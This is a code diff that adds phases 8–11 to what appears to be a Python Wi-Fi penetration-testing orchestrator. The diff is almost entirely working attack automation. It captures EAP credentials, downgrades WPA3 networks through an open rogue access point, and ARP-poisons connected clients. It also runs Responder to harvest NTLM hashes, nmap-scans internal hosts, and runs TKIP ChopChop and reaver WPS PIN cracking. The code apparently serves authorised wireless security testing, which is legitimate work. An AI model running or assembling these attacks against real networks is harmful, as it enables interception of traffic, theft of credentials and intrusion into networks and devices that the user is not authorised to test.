+            )
+            cred_lines = [l for l in out.splitlines()
+                          if re.search(r"username|password|mschapv2|credential", l, re.I)]
+            if cred_lines:
+                cred_file.write_text("\n".join(cred_lines), encoding="utf-8")
+                finding_from_cat(
+                    "eap_downgrade_creds",
+                    data={"ssid": ssid, "bssid": bssid,
+                          "credentials_raw": "\n".join(cred_lines[:20])},
+                    output_file=str(cred_file),
+                    title_override=f"EAP Downgrade: Credentials Captured from {ssid}",
+                )
+                log(f"Phase 8: Credentials captured for {ssid!r}")
+            else:
+                log(f"Phase 8: No credentials captured for {ssid!r}")
+        except Exception as exc:
+            err(f"Phase 8: eaphammer error for {ssid!r}: {exc}")
+
+    status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "complete")
+
+
+# ── Phase 9: SAE Transition Mode Downgrade ────────────────────────────────────
+
+def phase_sae_downgrade(monitor_iface: str, primary_iface: str,
+                         target_aps: list, enriched_aps: list,
+                         output_dir: Path, rogue_cfg: dict, timeout: int) -> None:
+    status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "running")
+
+    aps = target_aps or enriched_aps
+    wpa3_transition = [
+        ap for ap in aps
+        if re.search(r"SAE|WPA3", (ap.get("encryption") or "") + " " + (ap.get("auth") or ""), re.I)
+        and re.search(r"WPA2|PSK", (ap.get("encryption") or "") + " " + (ap.get("auth") or ""), re.I)
+    ]
+    if not wpa3_transition:
+        log("Phase 9: No WPA3/WPA2 transition-mode APs found — skipping.")
+        status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "skipped")
+        return
+
+    ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
+    if not ap_iface:
+        ap_iface = _find_ap_interface([monitor_iface, primary_iface])
+    if not ap_iface:
+        log("Phase 9: No second wireless interface for downgrade AP — skipping.")
+        status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "skipped")
+        return
+
+    dg_dir = output_dir / "sae_downgrade"
+    dg_dir.mkdir(exist_ok=True)
+
+    for ap in wpa3_transition:
+        ssid    = ap.get("ssid", "")
+        bssid   = ap.get("bssid", "")
+        channel = int(ap.get("channel") or 6)
+        log(f"Phase 9: WPA2-only rogue AP targeting {ssid!r} [{bssid}] (transition mode)")
+
+        if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
+            continue
+        ha_conf = _write_hostapd_conf(ssid, "", channel, "OPEN", "", ap_iface, dg_dir)
+        dm_conf = _write_dnsmasq_conf(ap_iface, dg_dir)
+
+        cap_file = dg_dir / f"sae_dg_{bssid.replace(':','')}.cap"
+        airodump_proc = subprocess.Popen(
+            ["airodump-ng", "--bssid", bssid, "-c", str(channel),
+             "-w", str(dg_dir / f"sae_dg_{bssid.replace(':','')}"),
+             "--output-format", "pcap", monitor_iface],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        dnsmasq_proc = subprocess.Popen(
+            ["dnsmasq", "--conf-file=" + str(dm_conf), "--no-daemon"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        with open(dg_dir / "hostapd_sae.log", "w") as hlog:
+            hostapd_proc = subprocess.Popen(
+                ["hostapd", str(ha_conf)], stdout=hlog, stderr=hlog,
+            )
+
+        duration = min(timeout, 120)
+        log(f"Phase 9: Rogue AP active for {duration}s — monitoring for WPA2 associations")
+        time.sleep(duration)
+
+        for proc in (hostapd_proc, dnsmasq_proc, airodump_proc):
+            _kill_proc(proc)
+        subprocess.run(["ip", "addr", "flush", "dev", ap_iface],
+                       check=False, capture_output=True)
+
+        # Look for captured handshakes
+        caps = list(dg_dir.glob(f"sae_dg_{bssid.replace(':','')}*.cap"))
+        handshake_found = False
+        if caps and shutil.which("aircrack-ng"):
+            for cap in caps:
+                chk, _ = _run(["aircrack-ng", "-a", "2", str(cap)], timeout=30)
+                if re.search(r"1 handshake", chk, re.I):
+                    handshake_found = True
+                    break
+
+        result = {
+            "ssid": ssid, "bssid": bssid,
+            "downgrade_attempted": True,
+            "handshake_captured": handshake_found,
+        }
+        (dg_dir / "sae_downgrade_results.json").write_text(
+            json.dumps(result, indent=2), encoding="utf-8"
+        )
+        finding_from_cat(
+            "sae_transition_downgrade",
+            data=result,
+            output_file=str(dg_dir / "sae_downgrade_results.json"),
+            title_override=f"WPA3 SAE Transition Mode Downgrade Tested: {ssid}",
+        )
+        log(f"Phase 9: {ssid!r} — handshake {'captured' if handshake_found else 'not captured'}")
+
+    status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "complete")
+
+
+# ── Phase 10: Post-Connection Attacks ─────────────────────────────────────────
+
+def _get_ap_dhcp_clients(ap_iface: str) -> list:
+    clients = []
+    for lease_path in [Path("/var/lib/misc/dnsmasq.leases"),
+                        Path("/var/lib/dnsmasq/dnsmasq.leases")]:
+        if lease_path.exists():
+            try:
+                for line in lease_path.read_text().splitlines():
+                    parts = line.split()
+                    if len(parts) >= 3:
+                        clients.append({"mac": parts[1], "ip": parts[2]})
+            except Exception:
+                pass
+    if not clients and shutil.which("arp"):
+        out, _ = _run(["arp", "-i", ap_iface, "-n"], timeout=10)
+        for line in out.splitlines()[1:]:
+            parts = line.split()
+            if len(parts) >= 3 and parts[2] != "<incomplete>":
+                clients.append({"ip": parts[0], "mac": parts[2]})
+    return clients
+
+
+def _detect_local_range(ap_iface: str) -> str:
+    try:
+        out, _ = _run(["ip", "addr", "show", ap_iface], timeout=5)
+        m = re.search(r"inet\s+([\d.]+/\d+)", out)
+        if m:
+            net = ipaddress.IPv4Interface(m.group(1)).network
+            return str(net)
+    except Exception:
+        pass
+    return _CAPTIVE_CIDR
+
+
+def phase_post_connection(ap_iface: str, output_dir: Path,
+                           post_cfg: dict, timeout: int) -> None:
+    status("p10_post", "Phase 10: Post-Connection Attacks", "running")
+
+    if not ap_iface:
+        log("Phase 10: No AP interface configured — skipping post-connection attacks.")
+        status("p10_post", "Phase 10: Post-Connection Attacks", "skipped")
+        return
+
+    pc_dir = output_dir / "post_connection"
+    pc_dir.mkdir(exist_ok=True)
+
+    network_range = post_cfg.get("scan_range") or _detect_local_range(ap_iface)
+    duration      = int(post_cfg.get("duration", 120))
+    clients       = _get_ap_dhcp_clients(ap_iface)
+    log(f"Phase 10: Interface={ap_iface}  Network={network_range}  "
+        f"Clients={len(clients)}")
+
+    # ── 10a: ARP Poisoning / MITM ─────────────────────────────────────────────
+    if post_cfg.get("arp_poison", True):
+        status("p10_arp", "Phase 10a: ARP Poisoning / MITM", "running")
+        arpspoof = shutil.which("arpspoof")
+        bettercap = shutil.which("bettercap")
+        arp_results = {"targets": [], "tool": None}
+
+        if arpspoof and clients:
+            subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
+                           check=False, capture_output=True)
+            gateway = _CAPTIVE_IP
+            procs = []
+            for cl in clients[:5]:  # limit to 5 targets
+                target_ip = cl.get("ip", "")
+                if not target_ip or target_ip == gateway:
+                    continue
+                log(f"Phase 10a: ARP poisoning {target_ip} ↔ {gateway}")
+                p1 = subprocess.Popen(
+                    ["arpspoof", "-i", ap_iface, "-t", target_ip, gateway],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                )
+                p2 = subprocess.Popen(
+                    ["arpspoof", "-i", ap_iface, "-t", gateway, target_ip],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                )
+                procs.extend([p1, p2])
+                arp_results["targets"].append(target_ip)
+            arp_results["tool"] = "arpspoof"
+            time.sleep(min(duration // 2, 60))
+            for p in procs:
+                _kill_proc(p)
+        elif bettercap and clients:
+            log("Phase 10a: ARP poisoning via bettercap")
+            bc_script = pc_dir / "arp.cap"
+            targets_str = ",".join(c.get("ip", "") for c in clients[:5] if c.get("ip"))
+            bc_script.write_text(
+                f"set arp.spoof.targets {targets_str}\n"
+                "arp.spoof on\n"
+                f"sleep {min(duration//2, 60)}\n"
+                "arp.spoof off\n"
+                "quit\n",
+                encoding="utf-8",
+            )
+            out, _ = _run(
+                ["bettercap", "-iface", ap_iface, "-caplet", str(bc_script)],
+                timeout=min(duration // 2, 70),
+            )
+            (pc_dir / "bettercap_arp.log").write_text(out, encoding="utf-8")
+            arp_results["tool"] = "bettercap"
+        else:
+            log("Phase 10a: arpspoof/bettercap not found or no clients — skipping ARP poison.")
+
+        (pc_dir / "arp_results.json").write_text(
+            json.dumps(arp_results, indent=2), encoding="utf-8"
+        )
+        if arp_results["targets"]:
+            finding_from_cat(
+                "arp_poison",
+                data=arp_results,
+                output_file=str(pc_dir / "arp_results.json"),
+                title_override=f"ARP Poisoning MITM: {len(arp_results['targets'])} Target(s) Poisoned",
+            )
+        status("p10_arp", "Phase 10a: ARP Poisoning / MITM", "complete")
+
+    # ── 10b: LLMNR / NBT-NS / mDNS Poisoning ─────────────────────────────────
+    if post_cfg.get("llmnr_poison", True):
+        status("p10_llmnr", "Phase 10b: LLMNR / NBT-NS Poisoning", "running")
+        responder_bin = (
+            shutil.which("responder") or
+            shutil.which("Responder") or
+            "/opt/Responder/Responder.py"
+        )
+        responder_path = Path(responder_bin) if responder_bin else None
+
+        if responder_path and responder_path.exists():
+            log(f"Phase 10b: Responder on {ap_iface} for {min(duration, 90)}s")
+            resp_log = pc_dir / "responder.log"
+            cmd = (["python3", str(responder_path)]
+                   if responder_path.suffix == ".py"
+                   else [str(responder_path)])
+            cmd += ["-I", ap_iface, "-w", "-d", "-f", "--lm"]
+            try:
+                with open(resp_log, "w") as rlog:
+                    proc = subprocess.Popen(cmd, stdout=rlog, stderr=rlog)
+                time.sleep(min(duration, 90))
+                _kill_proc(proc)
+                raw = resp_log.read_text(encoding="utf-8", errors="replace")
+                hashes = re.findall(
+                    r"(NTLMv[12]|LM|NTHash)[^\n]*\n([^\n]+)", raw
+                )
+                responder_dir = Path("/usr/share/responder/logs")
+                if not responder_dir.exists():
+                    responder_dir = Path("/opt/Responder/logs")
+                captured_hashes = []
+                if responder_dir.exists():
+                    for hf in sorted(responder_dir.glob("*.txt"))[-5:]:
+                        try:
+                            content = hf.read_text(encoding="utf-8", errors="replace")
+                            if content.strip():
+                                captured_hashes.append({
+                                    "file": str(hf), "content": content[:500]
+                                })
+                                (pc_dir / hf.name).write_text(content, encoding="utf-8")
+                        except Exception:
+                            pass
+                if captured_hashes or hashes:
+                    finding_from_cat(
+                        "llmnr_hashes",
+                        data={"hashes_captured": len(captured_hashes),
+                              "interface": ap_iface},
+                        output_file=str(resp_log),
+                        title_override="LLMNR/NBT-NS Credential Hashes Captured",
+                    )
+                    log(f"Phase 10b: {len(captured_hashes)} hash file(s) captured")
+                else:
+                    log("Phase 10b: Responder ran — no hashes captured.")
+            except Exception as exc:
+                err(f"Phase 10b: Responder error: {exc}")
+        else:
+            log("Phase 10b: Responder not found — skipping LLMNR poisoning.")
+        status("p10_llmnr", "Phase 10b: LLMNR / NBT-NS Poisoning", "complete")
+
+    # ── 10c: Internal Network Port Scan ───────────────────────────────────────
+    if post_cfg.get("port_scan", True):
+        status("p10_portscan", "Phase 10c: Internal Network Port Scan", "running")
+        if not shutil.which("nmap"):
+            log("Phase 10c: nmap not installed — skipping port scan.")
+        else:
+            log(f"Phase 10c: Scanning {network_range} with nmap")
+            scan_dir = pc_dir / "nmap"
+            scan_dir.mkdir(exist_ok=True)
+            out_base = str(scan_dir / "scan")
+            out, rc  = _run(
+                ["nmap", "-sV", "--open", "-T4", "-O",
+                 "-oA", out_base, network_range],
+                timeout=min(timeout, 300),
+            )
+            (scan_dir / "nmap.log").write_text(out, encoding="utf-8")
+            # Parse for interesting hosts
+            hosts = re.findall(
+                r"Nmap scan report for ([\d.]+)\n(.*?)(?=Nmap scan report|\Z)",
+                out, re.S,
+            )
+            interesting = []
+            for host_ip, host_body in hosts:
+                open_ports = re.findall(r"(\d+/(?:tcp|udp)\s+open\s+\S+)", host_body)
+                if open_ports:
+                    interesting.append({"ip": host_ip, "ports": open_ports})
+            if interesting:
+                (scan_dir / "interesting_hosts.json").write_text(
+                    json.dumps(interesting, indent=2), encoding="utf-8"
+                )
+                finding_from_cat(
+                    "internal_hosts",
+                    data={"network": network_range, "hosts": interesting},
+                    output_file=str(scan_dir / "interesting_hosts.json"),
+                    title_override=f"Internal Network Hosts Discovered: {len(interesting)} Target(s)",
+                )
+                log(f"Phase 10c: {len(interesting)} host(s) with open ports found")
+            else:
+                log("Phase 10c: No hosts with open ports found.")
+        status("p10_portscan", "Phase 10c: Internal Network Port Scan", "complete")
+
+    status("p10_post", "Phase 10: Post-Connection Attacks", "complete")
+
+
+# ── Phase 11: Legacy / Niche Attacks ─────────────────────────────────────────
+
+def phase_legacy_attacks(monitor_iface: str, target_aps: list,
+                          enriched_aps: list, output_dir: Path,
+                          tools: dict, timeout: int) -> None:
+    status("p11_legacy", "Phase 11: Legacy / Niche Attacks", "running")
+    aps    = target_aps or enriched_aps
+    lg_dir = output_dir / "legacy_attacks"
+    lg_dir.mkdir(exist_ok=True)
+
+    # ── 11a: TKIP ChopChop / Fragmentation ────────────────────────────────────
+    status("p11_tkip", "Phase 11a: TKIP ChopChop / Fragmentation", "running")
+    tkip_aps = [
+        ap for ap in aps
+        if re.search(r"\bTKIP\b", ap.get("cipher") or ap.get("encryption") or "", re.I)
+    ]
+    if tkip_aps:
+        tkip_dir = lg_dir / "tkip"
+        tkip_dir.mkdir(exist_ok=True)
+        for ap in tkip_aps:
+            bssid   = ap.get("bssid", "")
+            ssid    = ap.get("ssid", "")
+            clients = ap.get("clients") or []
+            client_mac = clients[0]["mac"] if clients else "FF:FF:FF:FF:FF:FF"
+            log(f"Phase 11a: TKIP detected on {ssid!r} [{bssid}] — attempting ChopChop")
+            finding_from_cat(
+                "tkip_detected",
+                data={"ssid": ssid, "bssid": bssid},
+                output_file=str(tkip_dir / "tkip_findings.json"),
+                title_override=f"TKIP Cipher in Use (Deprecated): {ssid}",
+            )
+            # Attempt ChopChop with auto-accept first packet
+            try:
+                proc = subprocess.Popen(
+                    ["aireplay-ng", "--chopchop", "-b", bssid,
+                     "-h", client_mac, "-D", monitor_iface],
+                    stdin=subprocess.PIPE,
+                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                )
+                out_bytes, _ = proc.communicate(input=b"y\n", timeout=min(timeout, 60))
+                out_text = out_bytes.decode("utf-8", errors="replace")
+                (tkip_dir / f"chopchop_{bssid.replace(':','')}.txt").write_text(
+                    out_text, encoding="utf-8"
+                )
+                if re.search(r"Saving chosen packet|\.xor", out_text, re.I):
+                    log(f"Phase 11a: ChopChop XOR keystream obtained for {ssid!r}")
+                    finding_from_cat(
+                        "tkip_chopchop",
+                        data={"ssid": ssid, "bssid": bssid},
+                        output_file=str(tkip_dir / f"chopchop_{bssid.replace(':','')}.txt"),
+                        title_override=f"TKIP ChopChop XOR Keystream Extracted: {ssid}",
+                    )
+                else:
+                    log(f"Phase 11a: ChopChop did not produce keystream for {ssid!r}")
+            except subprocess.TimeoutExpired:
+                log(f"Phase 11a: ChopChop timed out for {ssid!r}")
+            except Exception as exc:
+                err(f"Phase 11a: ChopChop error: {exc}")
+    else:
+        log("Phase 11a: No TKIP-cipher APs found — skipping TKIP attacks.")
+    status("p11_tkip", "Phase 11a: TKIP ChopChop / Fragmentation", "complete")
+
+    # ── 11b: Wi-Fi Direct / P2P WPS ──────────────────────────────────────────
+    status("p11_wifidirect", "Phase 11b: Wi-Fi Direct / P2P WPS Scanning", "running")
+    p2p_dir = lg_dir / "wifidirect"
+    p2p_dir.mkdir(exist_ok=True)
+    p2p_devices = []
+
+    # Scan with wash for WPS devices
+    if shutil.which("wash"):
+        log("Phase 11b: Scanning for WPS/P2P devices with wash")
+        out, rc = _run(["wash", "-i", monitor_iface, "-s", "-j"], timeout=min(timeout, 60))
+        (p2p_dir / "wash_output.txt").write_text(out, encoding="utf-8")
+        for line in out.splitlines():
+            m = re.search(
+                r"((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+.*?\s+(\d+)\s+.*?(DIRECT-\S+|\S+)",
+                line
+            )
+            if m or "DIRECT-" in line:
+                bssid_m = re.search(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})", line)
+                ssid_m  = re.search(r"(DIRECT-\S+)", line)
+                chan_m  = re.search(r"\b(\d{1,3})\b", line)
+                if bssid_m:
+                    p2p_devices.append({
+                        "bssid": bssid_m.group(1),
+                        "ssid":  ssid_m.group(1) if ssid_m else "",
+                        "channel": int(chan_m.group(1)) if chan_m else 0,
+                    })
+
+    # Also scan iw for P2P-capable devices
+    if shutil.which("iw"):
+        out, _ = _run(["iw", "dev", monitor_iface, "scan"], timeout=30)
+        for block in re.split(r"(?=BSS [0-9a-f:]{17})", out):
+            if "P2P" not in block and "DIRECT-" not in block:
+                continue
+            bssid_m = re.search(r"BSS\s+([0-9a-f:]{17})", block)
+            ssid_m  = re.search(r'SSID:\s+(DIRECT-\S+)', block)
+            chan_m  = re.search(r"DS Parameter set:\s+channel\s+(\d+)", block)
+            if bssid_m:
+                entry = {
+                    "bssid": bssid_m.group(1),
+                    "ssid": ssid_m.group(1) if ssid_m else "",
+                    "channel": int(chan_m.group(1)) if chan_m else 0,
+                }
+                if entry["bssid"] not in {d["bssid"] for d in p2p_devices}:
+                    p2p_devices.append(entry)
+
+    if p2p_devices:
+        (p2p_dir / "p2p_devices.json").write_text(
+            json.dumps(p2p_devices, indent=2), encoding="utf-8"
+        )
+        log(f"Phase 11b: {len(p2p_devices)} Wi-Fi Direct device(s) found")
+        for device in p2p_devices:
+            bssid   = device["bssid"]
+            ssid    = device.get("ssid", "")
+            channel = device.get("channel", 6) or 6
+            log(f"Phase 11b: Attempting WPS PIN attack on {ssid!r} [{bssid}]")
+            reaver = shutil.which("reaver")
+            if reaver:
+                out, rc = _run(
+                    [reaver, "-i", monitor_iface, "-b", bssid,
+                     "-c", str(channel), "-S", "-N", "-d", "1",
+                     "-t", "5", "-vv"],
+                    timeout=min(timeout, 120),
+                )
+                (p2p_dir / f"reaver_{bssid.replace(':','')}.txt").write_text(
+                    out, encoding="utf-8"
+                )
+                if re.search(r"WPS PIN|WPA PSK|pin found", out, re.I):
+                    finding_from_cat(
+                        "wifidirect_wps_cracked",
+                        data={"bssid": bssid, "ssid": ssid},
+                        output_file=str(p2p_dir / f"reaver_{bssid.replace(':','')}.txt"),
+                        title_override=f"Wi-Fi Direct WPS PIN Obtained: {ssid} [{bssid}]",
+                    )
+                    log(f"Phase 11b: WPS PIN obtained for {ssid!r}")
+            finding_from_cat(
+                "wifidirect_found",
+                data={"bssid": bssid, "ssid": ssid, "channel": channel},
+                output_file=str(p2p_dir / "p2p_devices.json"),
+                title_override=f"Wi-Fi Direct / P2P Device Discovered: {ssid or bssid}",
+            )
+    else:
+        log("Phase 11b: No Wi-Fi Direct / P2P devices found.")
+    status("p11_wifidirect", "Phase 11b: Wi-Fi Direct / P2P WPS Scanning", "complete")
+
+    # ── 11c: Captive Portal Bypass ────────────────────────────────────────────
+    status("p11_captive", "Phase 11c: Captive Portal Bypass Testing", "running")
+    cp_dir = lg_dir / "captive_bypass"
+    cp_dir.mkdir(exist_ok=True)
+
+    bypass_results = []
+    # These tests require outbound connectivity on some interface
+    test_targets = [
+        ("dns_external",  "DNS to external resolver", "1.1.1.1"),
+        ("http_ip",       "HTTP to known IP",         "http://1.1.1.1"),
+        ("https_ip",      "HTTPS to known IP",        "https://1.1.1.1"),
+    ]
+    for test_id, test_name, target in test_targets:
+        result = {"test": test_name, "target": target, "success": False, "detail": ""}
+        try:
+            if test_id == "dns_external":
+                import socket as _sock
+                old_timeout = _sock.getdefaulttimeout()
+                _sock.setdefaulttimeout(5)
+                try:
+                    _sock.getaddrinfo("one.one.one.one", None)
+                    result["success"] = True
+                    result["detail"] = "DNS resolution succeeded"
+                except Exception as e:
+                    result["detail"] = str(e)
+                finally:
+                    _sock.setdefaulttimeout(old_timeout)
+            else:
+                req = urllib.request.Request(
+                    target,
+                    headers={"User-Agent": "Mozilla/5.0 (captive-bypass-test)"},
+                )
+                with urllib.request.urlopen(req, timeout=5) as resp:
+                    result["success"] = resp.status < 400
+                    result["detail"]  = f"HTTP {resp.status}"
+        except Exception as e:
+            result["detail"] = str(e)
+        bypass_results.append(result)
+        log(f"Phase 11c [{test_name}]: {'PASS' if result['success'] else 'FAIL'} — {result['detail']}")
+
+    # DNS tunneling probe (check if we can resolve long subdomains — tunneling indicator)
+    try:
+        import socket as _sock
+        _sock.setdefaulttimeout(3)
+        _sock.getaddrinfo("aabbccddaabbccddaabb.probe.example.com", None)
+        bypass_results.append({"test": "dns_tunnel_probe", "success": True,
+                                "detail": "Long DNS subdomain resolved — tunneling may be possible"})
+    except Exception:
+        bypass_results.append({"test": "dns_tunnel_probe", "success": False,
+                                "detail": "DNS tunneling probe blocked"})
+
+    (cp_dir / "bypass_results.json").write_text(
+        json.dumps(bypass_results, indent=2), encoding="utf-8"
+    )
+    bypasses = [r for r in bypass_results if r["success"]]
+    if bypasses:
+        finding_from_cat(
+            "captive_bypass",
+            data={"bypasses": bypasses},
+            output_file=str(cp_dir / "bypass_results.json"),
+            title_override=f"Captive Portal Bypass Possible: {len(bypasses)} Method(s)",
+        )
+    status("p11_captive", "Phase 11c: Captive Portal Bypass Testing", "complete")
+
+    status("p11_legacy", "Phase 11: Legacy / Niche Attacks", "complete")
+
 # ── Main orchestrator ─────────────────────────────────────────────────────────
 
 def run(config: dict, project: str) -> None:
@@ -2327,6 +3668,8 @@ def run(config: dict, project: str) -> None:
     scrape_depth       = int(config.get("scrape_depth", 4))
     intel_scan_seconds = int(config.get("intel_scan_seconds", 45))
     deauth_packets     = int(config.get("deauth_packets", 5))
+    rogue_cfg          = config.get("rogue_ap", {})
+    post_cfg           = config.get("post_connection", {})
 
     # Scope enforcement
     scope_cfg    = config.get("scope", {})
@@ -2450,6 +3793,50 @@ def run(config: dict, project: str) -> None:
                 output_dir, timeout=timeout,
             )
 
+        # Collect any PSKs cracked in earlier phases for use by the rogue AP
+        cracked_psks = _collect_cracked_psks(output_dir)
+
+        if phases_cfg.get("rogue_ap", False):
+            phase_rogue_ap(
+                active_monitor, interface, target_aps, enriched_aps,
+                output_dir, rogue_cfg, timeout, cracked_psks,
+            )
+
+        if phases_cfg.get("karma", False):
+            phase_karma(
+                active_monitor, interface, output_dir, rogue_cfg, timeout,
+            )
+
+        if phases_cfg.get("client_attacks", True):
+            phase_client_attacks(
+                active_monitor, target_aps, enriched_aps, output_dir, timeout,
+            )
+
+        if phases_cfg.get("eap_downgrade", False):
+            phase_eap_downgrade(
+                active_monitor, target_aps,
+                tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
+                output_dir, timeout,
+            )
+
+        if phases_cfg.get("sae_downgrade", False):
+            phase_sae_downgrade(
+                active_monitor, interface, target_aps, enriched_aps,
+                output_dir, rogue_cfg, timeout,
+            )
+
+        if phases_cfg.get("legacy_attacks", True):
+            phase_legacy_attacks(
+                active_monitor, target_aps, enriched_aps, output_dir,
+                tools, timeout,
+            )
+
+        if phases_cfg.get("post_connection", False):
+            _ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
+            if not _ap_iface:
+                _ap_iface = _find_ap_interface([interface, active_monitor])
+            phase_post_connection(_ap_iface, output_dir, post_cfg, timeout)
+
     finally:
         disable_monitor_mode(active_monitor, interface)
         # Clean up domain-derived temp wordlist
@@ -2505,7 +3892,9 @@ Examples:
                         help="Wireless interface (overrides config)")
     parser.add_argument("--phase",
                         choices=["wep", "pmkid", "wpa", "enterprise",
-                                 "wpa3", "drain", "krack"],
+                                 "wpa3", "drain", "krack", "rogue",
+                                 "karma", "client", "eap-downgrade",
+                                 "sae-downgrade", "post", "legacy"],
                         help="Run a single phase only")
     parser.add_argument("--ssid", action="append", dest="ssids", metavar="SSID",
                         help="Target SSID (repeatable; overrides config)")
@@ -2541,7 +3930,8 @@ def _startup_tool_check() -> None:
     if platform.system() != "Linux":
         return  # macOS support is limited — skip full check
     CRITICAL = ["airmon-ng", "airodump-ng", "aircrack-ng", "aireplay-ng"]
-    IMPORTANT = ["hcxdumptool", "hcxpcapngtool", "hashcat", "wash", "asleap"]
+    IMPORTANT = ["hcxdumptool", "hcxpcapngtool", "hashcat", "wash", "asleap",
+                 "hostapd", "dnsmasq", "nmap", "responder"]
     missing_critical  = [t for t in CRITICAL  if not shutil.which(t)]
     missing_important = [t for t in IMPORTANT if not shutil.which(t)]
     if missing_critical or missing_important:
@@ -2562,13 +3952,20 @@ def main():
 
     if args.list_phases:
         print("Available phases:")
-        print("  wep        — Phase 0:  WEP IV capture + PTW crack     (aircrack-ng)")
-        print("  pmkid      — Phase 1a: Clientless PMKID + hashcat      (hcxdumptool)")
-        print("  wpa        — Phase 1b: WPA handshake + WPS attacks     (wifite2)")
-        print("  enterprise — Phase 2:  WPA-Enterprise rogue AP + asleap(EAPHammer)")
-        print("  wpa3       — Phase 3:  WPA3 SAE crypto testing         (dragonslayer)")
-        print("  drain      — Phase 4:  WPA3 resource exhaustion        (dragondrain)")
-        print("  krack      — Phase 5:  WPA2 KRACK testing              (krackattacks)")
+        print("  wep           — Phase 0:  WEP IV capture + PTW crack         (aircrack-ng)")
+        print("  pmkid         — Phase 1a: Clientless PMKID + hashcat          (hcxdumptool)")
+        print("  wpa           — Phase 1b: WPA handshake + WPS attacks         (wifite2)")
+        print("  enterprise    — Phase 2:  WPA-Enterprise rogue AP + asleap    (EAPHammer)")
+        print("  wpa3          — Phase 3:  WPA3 SAE crypto testing             (dragonslayer)")
+        print("  drain         — Phase 4:  WPA3 resource exhaustion            (dragondrain)")
+        print("  krack         — Phase 5:  WPA2 KRACK testing                 (krackattacks)")
+        print("  rogue         — Phase 6a: Rogue AP / Evil Twin + PSK portal   (hostapd+dnsmasq)")
+        print("  karma         — Phase 6b: KARMA / MANA probe response         (hostapd-mana)")
+        print("  client        — Phase 7:  PMF test + BTM hijack + probe harvest(scapy)")
+        print("  eap-downgrade — Phase 8:  EAP downgrade credential capture    (EAPHammer)")
+        print("  sae-downgrade — Phase 9:  SAE transition mode downgrade       (hostapd)")
+        print("  post          — Phase 10: ARP poison + LLMNR/NBT-NS + portscan(responder+nmap)")
+        print("  legacy        — Phase 11: TKIP ChopChop + Wi-Fi Direct + captive bypass")
         sys.exit(0)
 
     _startup_tool_check()
@@ -2635,17 +4032,26 @@ def main():
 
     if args.phase:
         _phase_map = {
-            "wep":        "wep",
-            "pmkid":      "pmkid",
-            "wpa":        "wpa_handshake",
-            "enterprise": "wpa_enterprise",
-            "wpa3":       "dragonblood_sae",
-            "drain":      "dragonblood_drain",
-            "krack":      "krack",
+            "wep":            "wep",
+            "pmkid":          "pmkid",
+            "wpa":            "wpa_handshake",
+            "enterprise":     "wpa_enterprise",
+            "wpa3":           "dragonblood_sae",
+            "drain":          "dragonblood_drain",
+            "krack":          "krack",
+            "rogue":          "rogue_ap",
+            "karma":          "karma",
+            "client":         "client_attacks",
+            "eap-downgrade":  "eap_downgrade",
+            "sae-downgrade":  "sae_downgrade",
+            "post":           "post_connection",
+            "legacy":         "legacy_attacks",
         }
         _all_keys = [
             "wep", "pmkid", "wpa_handshake", "wpa_enterprise",
             "dragonblood_sae", "dragonblood_drain", "krack",
+            "rogue_ap", "karma", "client_attacks", "eap_downgrade",
+            "sae_downgrade", "post_connection", "legacy_attacks",
         ]
         config["phases"] = {k: (k == _phase_map[args.phase]) for k in _all_keys}
 
